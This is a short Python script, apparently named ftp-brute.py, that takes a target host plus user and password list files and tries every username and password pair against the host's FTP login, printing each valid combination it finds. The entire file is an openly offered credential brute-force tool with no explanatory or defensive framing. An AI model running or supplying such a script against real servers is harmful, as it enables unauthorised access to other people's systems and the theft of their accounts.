from ftplib import FTP
import sys


if len(sys.argv) < 2:
    print("usage: ./ftp-brute.py <host> <userlist> <passlist>")

else:
    ftp = FTP(sys.argv[1])
    userlist = open(sys.argv[2]).read().splitlines()
    passlist = open(sys.argv[3]).read().splitlines()
    for user in userlist:
        for password in passlist:
            print("trying user: ", user, "with pass: ", password)
            try:
                ftp.login(user=user, passwd=password)
                print("[+]VALID CREDENTIALS: ", user, " ", password)
            except:
                continue

    
